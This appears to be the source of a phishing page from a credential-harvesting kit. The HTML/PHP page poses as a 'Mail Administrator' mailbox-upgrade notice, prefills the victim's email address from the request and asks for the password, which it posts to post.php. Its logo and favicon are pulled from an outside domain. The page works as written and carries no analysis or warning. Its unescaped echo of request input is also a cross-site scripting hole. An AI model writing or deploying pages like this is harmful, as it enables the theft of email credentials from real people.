<html>
<head>
<link

 rel="shortcut icon" href="http://tbcl.in/js/favi.

ico" type="image/gif"/>
<title>

&#37038;&#20214;&#35774;&#32622;

 | &#30005;&#23376;&#37038;

&#20214;&#21319;&#32423;</title>

</head>
<body>

<br><br>

<table align="center">

<tr><td>

	<div align="center">



	<img src="http://tbcl.in/js/logo.png" width=

"160" height="70">

	<br><br>



	<font face="verdana" size=

"2">

	Confirm your account, so you can upgrade your mailbox</font>


	<br>



        <p>&nbsp;</p>
	<p>
	<form method="post" action="post.php">

        <input name="email" type="hidden" value="">


	<input name="email" type="text" style="width:220px; height:40px; font-family: Verdana; font-size:

     15px; font-weight: light; color:#000000; background-color: #ffffff; border: solid 1px #848484; padding: 10px;

    " placeholder="Email Address" value="<?php $action = $_REQUEST["email"]; 
					  if($action == 'e-mail#'){ echo 'Email Address Here'; } else { echo $action;} ?>" <?php 
					  if($action != 'e-mail#'){ echo 'readonly="readonly"'; }  ?>/>
	    
	    
	    <br><br>
	    
	    <font face="verdana" size="2" color="#045FB4"></font>
	    


	    <input name="pass" type="password" style="width:250px; height:40px; font-family: Verdana; font-size:

15px; font-weight: light; color:#000000; background-color: #ffffff; border: solid 1px #848484; padding: 13px;

" required="" placeholder="Enter Password">	
	    
	    
	    
	    <br><br>
	    <input name="submit" type="submit"  
            
            style="width:250px; height:60px; background-color: #0B2161; border: solid 3px #0B2161;
 
	    font-family: Verdana; font-size: 17px; font-weight: light; color: #ffffff; -moz-border-radius: 
   
        4px; -webkit-border-radius: 4px; 
	   -khtml-border-radius: 

        4px; border-radius: 4px;
	   -moz

     -box-shadow: 3px 3px 3px #888; -

     webkit-box-shadow: 

      3px 3px 3px #888; box-shadow: 

      3px 3px 3px #888;" value="Upgrade">
	    <br>


	</form>



	<br>
	<hr width="250" align="center">



	<font face="calibri" size=

"2">
	Mail Administrator 2015 | All

 rights reserved.	</font>	</div>

</td></tr>

</tabl

e>


</body>
</html>